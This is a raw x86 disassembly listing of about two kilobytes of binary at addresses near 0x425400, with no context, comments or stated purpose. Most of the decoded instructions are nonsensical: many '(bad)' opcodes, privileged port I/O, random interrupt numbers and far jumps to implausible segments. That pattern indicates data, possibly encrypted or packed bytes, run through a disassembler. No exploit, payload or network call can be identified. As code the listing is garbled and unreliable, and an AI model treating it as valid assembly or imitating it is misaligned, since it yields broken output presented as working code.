  42542e:	jns    0x425403
  425430:	mov    ebp,0xcdd35392
  425435:	lea    edx,[ecx]
  425437:	int    0x96
  425439:	adc    DWORD PTR [ebx],edi
  42543b:	(bad)  
  42543d:	(bad)  
  42543f:	jmp    0x4253d3
  425441:	shr    edx,cl
  425443:	sub    BYTE PTR [ebx+0x13],dl
  425446:	das    
  425447:	rcl    ebx,1
  425449:	in     al,dx
  42544a:	outs   dx,BYTE PTR ds:[esi]
  42544b:	int    0x76
  42544d:	cmc    
  42544e:	int    0x8d
  425450:	cmc    
  425451:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425457:	push   ebx
  425458:	sar    DWORD PTR [ebx],cl
  42545a:	lds    ecx,FWORD PTR [edx]
  42545c:	jbe    0x425457
  42545e:	iret   
  42545f:	jbe    0x42545a
  425461:	jo     0x425420
  425463:	mov    ecx,0xa0000fe
  425468:	jbe    0x425463
  42546a:	int    0x76
  42546c:	stc    
  42546d:	int    0x8d
  42546f:	cmc    
  425470:	or     al,BYTE PTR ds:0xfc9dcf
  425476:	add    ch,cl
  425478:	jbe    0x425477
  42547a:	int    0x8d
  42547c:	std    
  42547d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425480:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425487:	push   ebx
  425488:	rol    DWORD PTR [edi+0x760af576],cl
  42548e:	cmc    
  42548f:	int    0x76
  425491:	in     eax,dx
  425492:	int    0x8d
  425494:	in     eax,dx
  425495:	cmp    esi,eax
  425497:	shl    edx,cl
  425499:	sub    BYTE PTR [ebx],bh
  42549b:	jns    0x425470
  42549d:	mov    ebp,0xcdd35392
  4254a2:	(bad)  
  4254a3:	std    
  4254a4:	int    0x96
  4254a6:	std    
  4254a7:	cmp    ecx,DWORD PTR [edi]
  4254a9:	cmp    ebx,ecx
  4254ab:	shr    ebx,cl
  4254ad:	xchg   edx,eax
  4254ae:	shr    edx,cl
  4254b0:	sub    BYTE PTR [ebx+0x13],dl
  4254b3:	xor    edx,ebx
  4254b5:	int    0x8d
  4254b7:	cmc    
  4254b8:	inc    ebx
  4254b9:	jge    0x425493
  4254bb:	mov    bl,0xcd
  4254bd:	jbe    0x425474
  4254bf:	int    0x8d
  4254c1:	mov    ch,0x3b
  4254c3:	jns    0x425500
  4254c5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254cc:	push   ebx
  4254cd:	ror    DWORD PTR [edx],cl
  4254cf:	jbe    0x4254ca
  4254d1:	leave  
  4254d2:	jbe    0x4254c1
  4254d4:	bound  ebx,QWORD PTR [edi]
  4254d6:	xchg   BYTE PTR ds:0x1ebddcd,dh
  4254dc:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254e3:	jbe    0x42548a
  4254e5:	cmp    ecx,ecx
  4254e7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254ed:	jmp    0x425481
  4254ef:	push   ebx
  4254f0:	jge    0x4254bf
  4254f2:	jbe    0x4254ed
  4254f4:	aad    0xbd
  4254f6:	or     dh,BYTE PTR [esi-0x63]
  4254f9:	int    0x76
  4254fb:	mov    dl,cl
  4254fd:	or     BYTE PTR [ecx],0x76
  425500:	in     al,dx
  425501:	retf   0xec76
  425504:	int    0x8d
  425506:	stc    
  425507:	das    
  425508:	pop    ecx
  425509:	ins    DWORD PTR es:[edi],dx
  42550a:	cmp    edx,ebx
  42550c:	or     dh,BYTE PTR [esi-0xb]
  42550f:	int    0x76
  425511:	in     eax,dx
  425512:	int    0x8d
  425514:	in     eax,dx
  425515:	cmp    edi,DWORD PTR [ecx-0x2d]
  425518:	mov    ebp,0xd3f03b92
  42551d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425521:	int    0x8d
  425523:	cmc    
  425524:	sub    edx,ebx
  425526:	int    0x5
  425528:	push   es
  425529:	popf   
  42552a:	cld    
  42552b:	add    BYTE PTR [eax],al
  42552d:	int    0x8d
  42552f:	popf   
  425530:	cmp    edx,ebx
  425532:	or     dh,BYTE PTR [esi-0x7]
  425535:	int    0x76
  425537:	std    
  425538:	int    0x8d
  42553a:	std    
  42553b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42553e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425545:	push   ebx
  425546:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42554c:	std    
  42554d:	int    0x8d
  42554f:	std    
  425550:	cmp    edi,DWORD PTR [ecx+0x3b]
  425553:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42555a:	push   ebx
  42555b:	sar    DWORD PTR [esi],cl
  42555d:	jbe    0x42550c
  42555f:	int    0x76
  425561:	adc    ebp,ecx
  425563:	lea    edx,[ecx]
  425565:	cmp    esi,eax
  425567:	cmp    edi,DWORD PTR [ecx-0x2d]
  42556a:	repnz sub bl,dl
  42556d:	mov    ebp,0xcdd35392
  425572:	lea    ebp,[ebp+0x62f7d43]
  425578:	imul   eax,DWORD PTR [eax],0x0
  42557b:	add    ch,cl
  42557d:	jbe    0x425534
  42557f:	int    0x8d
  425581:	mov    ch,0x3b
  425583:	jns    0x4255c0
  425585:	lock shl edx,cl
  425588:	sub    bl,dl
  42558a:	mov    ebp,0xd353aa92
  42558f:	int    0x8d
  425591:	stc    
  425592:	test   al,0x3b
  425594:	shl    DWORD PTR [ebx-0x35],cl
  425597:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42559e:	in     eax,dx
  42559f:	xor    BYTE PTR [ebx],bh
  4255a1:	retf   
  4255a2:	pop    ebx
  4255a3:	call   0xbb05:0x2f888d5e
  4255aa:	add    BYTE PTR [eax+0x2f024380],0x5
  4255b1:	rol    DWORD PTR [eax-0x44d07f80],1
  4255b7:	cwde   
  4255b8:	sub    al,0x5d
  4255ba:	lahf   
  4255bb:	xor    eax,0x8d0a8080
  4255c0:	std    
  4255c1:	or     cl,BYTE PTR [ebp+0xaf13b11]
  4255c7:	(bad)  
  4255c8:	stc    
  4255c9:	mov    eax,0xe3b813cd
  4255ce:	retf   
  4255cf:	cmp    eax,DWORD PTR [eax]
  4255d1:	leave  
  4255d2:	jbe    0x4255c9
  4255d4:	adc    al,0x80
  4255d6:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  4255dd:	mov    eax,0xb8fde6cd
  4255e2:	jecxz  0x4255ad
  4255e4:	mov    eax,0xbb2ff93b
  4255e9:	(bad)  
  4255ea:	stc    
  4255eb:	iret   
  4255ec:	dec    esp
  4255ed:	into   
  4255ee:	mov    eax,0xd692de5e
  4255f3:	pop    edx
  4255f4:	das    
  4255f5:	mov    ebx,0xf58d0a89
  4255fa:	mov    eax,0x4dd67d43
  4255ff:	das    
  425600:	mov    ebx,0xa6cdfd8d
  425605:	mov    BYTE PTR [ecx],al
  425607:	fs push ds
  425609:	adc    ah,0x3b
  42560c:	das    
  42560d:	mov    ebx,0xa6cdfd8d
  425612:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425618:	mov    eax,0x3bb8d3e3
  42561d:	jge    0x4255d7
  42561f:	pop    esi
  425620:	(bad)  
  425621:	cmc    
  425622:	aam    0x23
  425624:	leave  
  425625:	jbe    0x42561c
  425627:	sbb    BYTE PTR [eax+0x76008080],al
  42562d:	stc    
  42562e:	int    0x7d
  425630:	mov    eax,0xb82c8e3b
  425635:	jecxz  0x425602
  425637:	mov    eax,0x82f98d5e
  42563c:	inc    ecx
  42563d:	in     al,dx
  42563e:	dec    edx
  42563f:	add    BYTE PTR [esi+0x11],dh
  425642:	leave  
  425643:	jbe    0x42563a
  425645:	push   ss
  425646:	add    BYTE PTR [eax-0x1944d080],0xfd
  42564d:	int    0xa6
  42564f:	mov    BYTE PTR [ebx],bh
  425651:	retf   
  425652:	pop    esp
  425653:	dec    esp
  425654:	sub    dl,ah
  425656:	push   ss
  425657:	add    BYTE PTR [esi-0x3],dh
  42565a:	add    al,0xe6
  42565c:	cmc    
  42565d:	sbb    BYTE PTR [edi],ch
  42565f:	push   es
  425660:	jb     0x425662
  425662:	add    BYTE PTR [eax],al
  425664:	cmp    ebp,DWORD PTR [ebp-0x56]
  425667:	arpl   bx,cx
  425669:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425670:	jecxz  0x425645
  425672:	mov    eax,0x6d3b7d3b
  425677:	mov    eax,0x2f2c8e43
  42567c:	adc    eax,0x96b9ec6d
  425681:	int    0xed
  425683:	add    al,0xed
  425685:	mov    esp,0xc09a985b
  42568a:	inc    esp
  42568b:	add    dh,dl
  42568d:	mov    ch,cl
  42568f:	adc    DWORD PTR [ebp+0xf90b],edi
  425695:	iret   
  425696:	js     0x4256ca
  425698:	or     dh,BYTE PTR [esi+0x25]
  42569b:	iret   
  42569c:	js     0x425712
  42569e:	or     dh,BYTE PTR [esi+0x2d]
  4256a1:	iret   
  4256a2:	js     0x42565c
  4256a4:	or     dh,BYTE PTR [esi+0x35]
  4256a7:	iret   
  4256a8:	pop    es
  4256a9:	or     DWORD PTR [eax+0x760a8080],eax
  4256af:	cmp    eax,0x804107cf
  4256b4:	add    BYTE PTR [eax-0x30ba89f6],0x7
  4256bb:	or     eax,0xa808080
  4256c0:	jbe    0x425692
  4256c2:	iret   
  4256c3:	pop    es
  4256c4:	out    dx,eax
  4256c5:	add    BYTE PTR [eax+0x55760a80],0xcf
  4256cc:	pop    es
  4256cd:	xor    BYTE PTR [ecx+0x760a8080],al
  4256d3:	pop    ebp
  4256d4:	iret   
  4256d5:	pop    es
  4256d6:	inc    edx
  4256d7:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256e1:	pop    es
  4256e2:	xchg   esp,eax
  4256e3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256ed:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256f4:	xchg   esi,eax
  4256f5:	icebp  
  4256f6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256fc:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425702:	(bad)  
  425703:	mov    cl,0xde
  425705:	adc    ebx,DWORD PTR [ebp-0x43]
  425708:	or     ah,BYTE PTR [ebx]
  42570a:	and    eax,0xcd0d760a
  42570f:	lea    edi,[ebp-0x33]
  425712:	out    0xd,al
  425714:	cmp    edi,ecx
  425716:	adc    al,BYTE PTR [edx]
  425718:	jnp    0x425751
  42571a:	ficom  WORD PTR [ebx]
  42571c:	das    
  42571d:	inc    ebp
  42571e:	cli    
  42571f:	xchg   edx,eax
  425720:	rcl    DWORD PTR [eax],cl
  425722:	xchg   edx,eax
  425723:	or     ah,dh
  425725:	mov    ch,0xcd
  425727:	out    0x7d,al
  425729:	int    0xa6
  42572b:	or     eax,0x3be1cd
  425730:	cmp    eax,DWORD PTR [ebx]
  425732:	shl    ebp,cl
  425734:	sub    BYTE PTR [ebx-0x10],dl
  425737:	int    0xe6
  425739:	mov    ch,0x61
  42573b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425742:	cld    
  425743:	push   ebx
  425744:	lock or dl,dh
  425747:	stc    
  425748:	das    
  425749:	add    eax,0x808080f2
  42574e:	adc    dh,BYTE PTR [esi-0xf]
  425751:	(bad)  
  425752:	mov    esp,0xeb5f8bbd
  425757:	or     ah,BYTE PTR [ebx]
  425759:	and    eax,0x12958d31
  42575e:	jbe    0x4256fd
  425760:	(bad)  
  425761:	mov    esp,0x8d318790
  425766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425767:	int    0x8d
  425769:	jge    0x425738
  42576b:	(bad)  
  42576c:	or     eax,0xcd7de6cd
  425771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425772:	or     eax,0x212113b
  425777:	jnp    0x4257b0
  425779:	ficom  WORD PTR [ebx]
  42577b:	das    
  42577c:	inc    ebp
  42577d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425783:	out    dx,eax
  425784:	xchg   edx,eax
  425785:	cmp    ebx,ebp
  425787:	cmp    eax,DWORD PTR [ebx]
  425789:	push   ebx
  42578a:	or     al,0x53
  42578c:	clc    
  42578d:	add    al,0xd3
  42578f:	add    BYTE PTR [ecx+ebx*4],al
  425792:	add    BYTE PTR [edx],cl
  425794:	lea    edi,[ebp+0xa]
  425797:	(bad)  
  425798:	or     eax,0x53f18dcd
  42579d:	lea    edx,[ebp+0x761223d4]
  4257a3:	icebp  
  4257a4:	mov    edx,DWORD PTR [ebx]
  4257a6:	dec    edx
  4257a7:	stc    
  4257a8:	pop    edi
  4257a9:	sbb    al,bl
  4257ab:	mov    ch,0x6b
  4257ad:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  4257b3:	(bad)
  4257b6:	std    
  4257b7:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  4257bd:	(bad)  
  4257be:	icebp  
  4257bf:	(bad)  
  4257c0:	mov    esp,0x76897abd
  4257c5:	xchg   ebp,eax
  4257c6:	adc    dh,BYTE PTR [esi-0x6f433963]
  4257cc:	add    al,0x12
  4257ce:	mov    dh,0xa5
  4257d0:	jmp    0x4257dc
  4257d2:	and    esp,DWORD PTR ds:0xcd7d8dcd
  4257d8:	lea    ecx,ds:0xcd7de6cd
  4257de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257df:	or     eax,0x92fc352f
  4257e4:	shr    ebx,cl
  4257e6:	sub    BYTE PTR [ebx],bh
  4257e8:	not    DWORD PTR [ebx-0xc]
  4257eb:	shr    ecx,cl
  4257ed:	xchg   edx,eax
  4257ee:	push   ebx
  4257ef:	lock adc al,BYTE PTR [edx]
  4257f2:	(bad)  
  4257f3:	aaa    
  4257f4:	ficom  WORD PTR [ebx]
  4257f6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257fc:	(bad)  
  4257fd:	or     eax,0xcd7d8dcd
  425802:	(bad)  
  425803:	or     eax,0xcd7de6cd
  425808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425809:	or     eax,0x212113b
  42580e:	jnp    0x425847
  425810:	ficom  WORD PTR [ebx]
  425812:	das    
  425813:	inc    ebp
  425814:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42581a:	out    dx,eax
  42581b:	xchg   edx,eax
  42581c:	cmp    ebx,ebp
  42581e:	cmp    eax,DWORD PTR [ebx]
  425820:	push   ebx
  425821:	or     al,0x53
  425823:	clc    
  425824:	push   ebx
  425825:	comiss xmm0,DWORD PTR [esi]
  425828:	xor    al,BYTE PTR [eax]
  42582a:	add    BYTE PTR [eax],al
  42582c:	int    0xd6
  42582e:	stc    
  42582f:	push   es
  425830:	imul   DWORD PTR [edi]
  425832:	add    eax,0x808080d1
  425837:	int    0x78
  425839:	fs int 0xe4
  42583c:	push   eax
  42583d:	fadd   QWORD PTR [edi+0x349acdff]
  425843:	int    0x6f
  425845:	and    al,0xcd
  425847:	jp     0x425875
  425849:	int    0xaa
  42584b:	sbb    al,0x87
  42584d:	cdq    
  42584e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425854:	xchg   DWORD PTR [edi],ecx
  425856:	xchg   DWORD PTR [ecx+0xa],edi
  425859:	(bad)  
  42585a:	in     eax,dx
  42585b:	or     dh,BYTE PTR [esi-0x6b]
  42585e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425864:	xchg   DWORD PTR [edx],ecx
  425866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425867:	cmc    
  425868:	cmp    ebx,edx
  42586a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425870:	fcom   st(4)
  425872:	in     al,dx
  425873:	xchg   ebp,ecx
  425875:	jbe    0x42580c
  425877:	int    0xa6
  425879:	or     eax,0x5b24bb2f
  42587e:	inc    ebx
  42587f:	call   0x14aa:0x436b771c
  425886:	ja     0x425830
  425888:	int    0x84
  42588a:	mov    al,0xcd
  42588c:	xchg   esi,eax
  42588d:	mov    ch,cl
  42588f:	and    al,0x1f
  425891:	or     dl,BYTE PTR [esi-0x30867803]
  425897:	xchg   esi,eax
  425898:	sbb    eax,0x9633a987
  42589d:	mov    BYTE PTR [edx],cl
  42589f:	jbe    0x4258b2
  4258a1:	or     dl,BYTE PTR [esi-0x4a89368b]
  4258a7:	push   ebx
  4258a8:	add    BYTE PTR [eax-0x2693280],0x4
  4258af:	pusha  
  4258b0:	adc    dh,0x28
  4258b3:	jo     0x425882
  4258b5:	jbe    0x42592c
  4258b7:	int    0x54
  4258b9:	xor    BYTE PTR [ebp+0xfddd],bh
  4258bf:	int    0xd6
  4258c1:	stc    
  4258c2:	int    0x8d
  4258c4:	in     eax,dx
  4258c5:	push   es
  4258c6:	ins    DWORD PTR es:[edi],dx
  4258c7:	aam    0x85
  4258c9:	int    0x76
  4258cb:	std    
  4258cc:	or     bl,BYTE PTR [ecx*8+0x76041176]
  4258d3:	std    
  4258d4:	test   BYTE PTR [eax],al
  4258d6:	lea    esi,[ebp-0x69321c2a]
  4258dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258dd:	push   edx
  4258de:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258e4:	or     dh,0xaa
  4258e7:	int    0x79
  4258e9:	test   al,0x63
  4258eb:	retf   
  4258ec:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258f3:	int    0xd6
  4258f5:	mov    BYTE PTR [eax],al
  4258f7:	pop    ecx
  4258f8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258fe:	mov    BYTE PTR [ebp+0xfee4],bh
  425904:	int    0x7
  425906:	cmp    eax,0x3b808081
  42590b:	retf   
  42590c:	pop    esi
  42590d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425913:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425919:	fwait
  42591a:	sbb    eax,0x5b808081
  42591f:	cwde   
  425920:	int    0x11
  425922:	pop    ebp
  425923:	lahf   
  425924:	xor    eax,0x4eec8080
  425929:	cmp    edi,DWORD PTR [ebp-0x48]
  42592c:	jecxz  0x4258f9
  42592e:	mov    eax,0xd2044a0a
  425933:	xchg   edx,eax
  425934:	add    al,0x79
  425936:	xchg   edx,eax
  425937:	das    
  425938:	mov    ebx,0x7d43b84e
  42593d:	(bad)  
  42593e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425942:	mov    eax,0x8cd920a
  425947:	sbb    eax,0x63808081
  42594c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425952:	sbb    eax,0xd3808081
  425957:	jmp    0xed0be0e2
  42595c:	dec    edx
  42595d:	add    DWORD PTR [edx],eax
  42595f:	add    DWORD PTR [ecx],0xffffffeb
  425962:	mov    esi,0x526c8809
  425967:	retf   0x14a
  42596a:	cli    
  42596b:	sbb    dh,dl
  42596d:	adc    BYTE PTR [ecx-0x80],bh
  425970:	or     ch,0x7
  425973:	sbb    eax,0x87808081
  425978:	leave  
  425979:	stos   BYTE PTR es:[edi],al
  42597a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425980:	mov    al,0x80
  425982:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425989:	and    eax,0x76c99a98
  42598e:	cmc    
  42598f:	xchg   ecx,eax
  425990:	aaa    
  425991:	ficom  WORD PTR [ebx]
  425993:	or     cl,BYTE PTR [ebp-0x12893607]
  425999:	(bad)  
  42599a:	aaa    
  42599b:	ficom  WORD PTR [ebx]
  42599d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  4259a3:	jbe    0x425962
  4259a5:	dec    ecx
  4259a6:	and    DWORD PTR [esi-0x28936cb],eax
  4259ac:	inc    ecx
  4259ad:	and    DWORD PTR [esi-0xe8936cb],eax
  4259b3:	out    0x37,al
  4259b5:	ficom  WORD PTR [ebx]
  4259b7:	or     cl,BYTE PTR [ebp+0x5d76c995]
  4259bd:	fidiv  WORD PTR [edi]
  4259bf:	ficom  WORD PTR [ebx]
  4259c1:	or     cl,BYTE PTR [ebp-0x1289329b]
  4259c7:	int    0x96
  4259c9:	adc    DWORD PTR [edi],ebp
  4259cb:	inc    ebp
  4259cc:	icebp  
  4259cd:	xchg   edx,eax
  4259ce:	shl    ebx,cl
  4259d0:	xchg   edx,eax
  4259d1:	int    0x96
  4259d3:	in     eax,dx
  4259d4:	int    0xd6
  4259d6:	adc    ebx,edx
  4259d8:	jmp    0x4229:0xbea6c328
  4259df:	cmp    ecx,ecx
  4259e1:	cmp    esi,edi
  4259e3:	push   ebx
  4259e4:	jns    0x4259f0
  4259e6:	jbe    0x42598d
  4259e8:	iret   
  4259e9:	jbe    0x425998
  4259eb:	or     dh,BYTE PTR [esi+0xd]
  4259ee:	int    0x76
  4259f0:	or     eax,0x8621d169
  4259f5:	xor    eax,0x37b680c9
  4259fa:	ficom  WORD PTR [ebx]
  4259fc:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a00:	(bad)  
  425a01:	std    
  425a02:	int    0x96
  425a04:	std    
  425a05:	cmp    ecx,DWORD PTR [edi]
  425a07:	shr    ebx,cl
  425a09:	xchg   edx,eax
  425a0a:	sar    bh,0x9c
  425a0d:	cmp    esi,ecx
  425a0f:	shr    edx,cl
  425a11:	sub    BYTE PTR [ebx+0x13],dl
  425a14:	int    0x96
  425a16:	std    
  425a17:	int    0xa6
  425a19:	std    
  425a1a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a20:	popf   
  425a21:	shl    ebp,cl
  425a23:	sub    BYTE PTR [ebx-0x2b],dl
  425a26:	xchg   DWORD PTR [ebx],edx
  425a28:	int    0x96
  425a2a:	std    
  425a2b:	int    0xa6
  425a2d:	std    
  425a2e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a34:	popf   
  425a35:	shl    ebp,cl
  425a37:	sub    BYTE PTR [ebx-0x2b],dl
  425a3a:	xchg   DWORD PTR [ebx],edx
  425a3c:	int    0x96
  425a3e:	std    
  425a3f:	int    0xa6
  425a41:	std    
  425a42:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a48:	popf   
  425a49:	shl    ebp,cl
  425a4b:	sub    BYTE PTR [ebx-0x2b],dl
  425a4e:	xchg   DWORD PTR [ebx],edx
  425a50:	or     cl,bh
  425a52:	nop
  425a53:	add    BYTE PTR [eax],al
  425a55:	add    ch,cl
  425a57:	lea    edi,[ebp+0x3bbd96cd]
  425a5d:	icebp  
  425a5e:	cmp    ecx,DWORD PTR [edi]
  425a60:	shr    edx,cl
  425a62:	sub    bl,dl
  425a64:	jmp    0x4259f8
  425a66:	push   ebx
  425a67:	adc    ecx,ebp
  425a69:	xchg   esi,eax
  425a6a:	mov    ebp,0x3bbda6cd
  425a6f:	cdq    
  425a70:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a76:	in     eax,0x28
  425a78:	push   ebx
  425a79:	aad    0xa
  425a7b:	int3   
  425a7c:	pop    ss
  425a7d:	aam    0x0
  425a7f:	add    BYTE PTR [eax],al
  425a81:	int    0x8d
  425a83:	dec    esp
  425a84:	int    0x89
  425a86:	int    0x96
  425a88:	std    
  425a89:	int    0xa6
  425a8b:	std    
  425a8c:	int    0x7e
  425a8e:	jo     0x425acb
  425a90:	popf   
  425a91:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a97:	in     eax,0x28
  425a99:	push   ebx
  425a9a:	aad    0xa
  425a9c:	int3   
  425a9d:	pop    ss
  425a9e:	aam    0x0
  425aa0:	add    BYTE PTR [eax],al
  425aa2:	int    0x8d
  425aa4:	xor    ch,cl
  425aa6:	xchg   esi,eax
  425aa7:	xor    BYTE PTR [ebx],bh
  425aa9:	icebp  
  425aaa:	cmp    ecx,DWORD PTR [edi]
  425aac:	shr    edx,cl
  425aae:	sub    bl,dl
  425ab0:	jmp    0x425a44
  425ab2:	push   ebx
  425ab3:	adc    ecx,ebp
  425ab5:	xchg   esi,eax
  425ab6:	std    
  425ab7:	int    0xa6
  425ab9:	std    
  425aba:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425ac0:	cdq    
  425ac1:	shl    ebx,cl
  425ac3:	xchg   edx,eax
  425ac4:	shl    ebp,cl
  425ac6:	sub    BYTE PTR [ebx-0x2b],dl
  425ac9:	int    0xa6
  425acb:	std    
  425acc:	cmp    edi,DWORD PTR [ecx-0x2d]
  425acf:	mov    ebp,0xfff40492
  425ad4:	shl    ebp,cl
  425ad6:	sub    BYTE PTR [ebx-0x3b],dl
  425ad9:	xchg   ecx,esi
  425adb:	int    0x76
  425add:	adc    al,0xa
  425adf:	int3   
  425ae0:	pop    ss
  425ae1:	aam    0x0
  425ae3:	add    BYTE PTR [eax],al
  425ae5:	int    0x8d
  425ae7:	adc    al,0x4
  425ae9:	add    bh,bh
  425aeb:	shl    edx,cl
  425aed:	sub    BYTE PTR [ebx],bh
  425aef:	jns    0x425ac4
  425af1:	mov    ebp,0xcdd35392
  425af6:	(bad)  
  425af7:	std    
  425af8:	int    0x96
  425afa:	std    
  425afb:	add    al,0xfb
  425afd:	(bad)  
  425afe:	cmp    ecx,DWORD PTR [edi]
  425b00:	shr    edx,cl
  425b02:	sub    bl,dl
  425b04:	jmp    0x425a98
  425b06:	push   ebx
  425b07:	adc    ecx,ebp
  425b09:	xchg   esi,eax
  425b0a:	std    
  425b0b:	int    0xa6
  425b0d:	std    
  425b0e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b14:	repz xchg edx,eax
  425b16:	shl    ebp,cl
  425b18:	sub    BYTE PTR [ebx-0x2b],dl
  425b1b:	xchg   DWORD PTR [ebx],edx
  425b1d:	int    0x96
  425b1f:	std    
  425b20:	int    0xa6
  425b22:	std    
  425b23:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b29:	in     eax,0x28
  425b2b:	shl    ebx,cl
  425b2d:	xchg   edx,eax
  425b2e:	push   ebx
  425b2f:	aad    0x87
  425b31:	adc    ecx,DWORD PTR [edx]
  425b33:	add    eax,0xd4cf
  425b38:	add    bh,cl
  425b3a:	push   es
  425b3b:	nop
  425b3c:	add    BYTE PTR [eax],al
  425b3e:	add    BYTE PTR [eax-0x33],dh
  425b41:	jbe    0x425b40
  425b43:	int    0x8d
  425b45:	std    
  425b46:	sar    bh,0x63
  425b49:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b4c:	or     al,0xd3
  425b4e:	mov    ebp,0x28f2d392
  425b53:	push   ebx
  425b54:	shl    DWORD PTR [eax-0x33],cl
  425b57:	jbe    0x425b85
  425b59:	iret   
  425b5a:	or     DWORD PTR [ecx-0x80],eax
  425b5d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b64:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b6b:	int    0x8d
  425b6d:	push   esp
  425b6e:	or     al,BYTE PTR [ecx-0x32528933]
  425b74:	lea    esi,[ebp-0x6d82bad1]
  425b7a:	shr    ebx,cl
  425b7c:	xchg   edx,eax
  425b7d:	int    0x8d
  425b7f:	lods   eax,DWORD PTR ds:[esi]
  425b80:	int    0x96
  425b82:	mov    ch,0x3b
  425b84:	leave  
  425b85:	cmp    ebx,edx
  425b87:	push   ebx
  425b88:	icebp  
  425b89:	bound  eax,QWORD PTR [eax]
  425b8b:	(bad)  
  425b8c:	xor    al,0xd3
  425b8e:	repnz sub BYTE PTR [eax],al
  425b91:	(bad)  
  425b92:	inc    esp
  425b93:	mov    ebp,0xfb94
  425b98:	int    0x76
  425b9a:	lods   eax,DWORD PTR ds:[esi]
  425b9b:	int    0x8d
  425b9d:	mov    ch,0x2f
  425b9f:	inc    ebp
  425ba0:	jge    0x425b34
  425ba2:	shr    ebx,cl
  425ba4:	xchg   edx,eax
  425ba5:	int    0x8d
  425ba7:	lods   eax,DWORD PTR ds:[esi]
  425ba8:	int    0x96
  425baa:	mov    ch,0x3b
  425bac:	leave  
  425bad:	cmp    ebx,edx
  425baf:	push   ebx
  425bb0:	icebp  
  425bb1:	bound  eax,QWORD PTR [eax]
  425bb3:	(bad)  
  425bb4:	push   esp
  425bb5:	shl    edx,cl
  425bb7:	sub    BYTE PTR [eax],al
  425bb9:	(bad)  
  425bba:	cmp    al,0xbd
  425bbc:	inc    esp
  425bbd:	sti    
  425bbe:	add    BYTE PTR [eax],al
  425bc0:	int    0x76
  425bc2:	std    
  425bc3:	int    0x8d
  425bc5:	std    
  425bc6:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425bc9:	repnz sub BYTE PTR [ebx],bh
  425bcc:	jns    0x425ba1
  425bce:	mov    ebp,0xcdd35392
  425bd3:	(bad)  
  425bd4:	std    
  425bd5:	int    0x96
  425bd7:	std    
  425bd8:	cmp    ecx,DWORD PTR [edi]
  425bda:	shr    ebx,cl
  425bdc:	xchg   edx,eax
  425bdd:	cmp    edx,ebp
  425bdf:	shr    edx,cl
  425be1:	sub    BYTE PTR [ebx+0x13],dl
  425be4:	xchg   ebx,edx
  425be6:	int    0x8d
  425be8:	std    
  425be9:	int    0x96
  425beb:	std    
  425bec:	cmp    ecx,DWORD PTR [edi]
  425bee:	shr    ebx,cl
  425bf0:	xchg   edx,eax
  425bf1:	cmp    edx,ebp
  425bf3:	shr    edx,cl
  425bf5:	sub    BYTE PTR [ebx+0x13],dl
  425bf8:	xchg   ebx,edx
  425bfa:	int    0x8d
  425bfc:	std    
  425bfd:	int    0x96
  425bff:	std    
  425c00:	cmp    ecx,DWORD PTR [edi]
  425c02:	shr    ebx,cl
  425c04:	xchg   edx,eax
  425c05:	cmp    edx,ebp
  425c07:	shr    edx,cl
  425c09:	sub    BYTE PTR [ebx+0x13],dl
  425c0c:	xchg   ebx,edx
  425c0e:	or     al,BYTE PTR [esi]
  425c10:	nop
  425c11:	add    BYTE PTR [eax],al
  425c13:	add    ch,cl
  425c15:	jbe    0x425c6b
  425c17:	int    0x80
  425c19:	int    0x8d
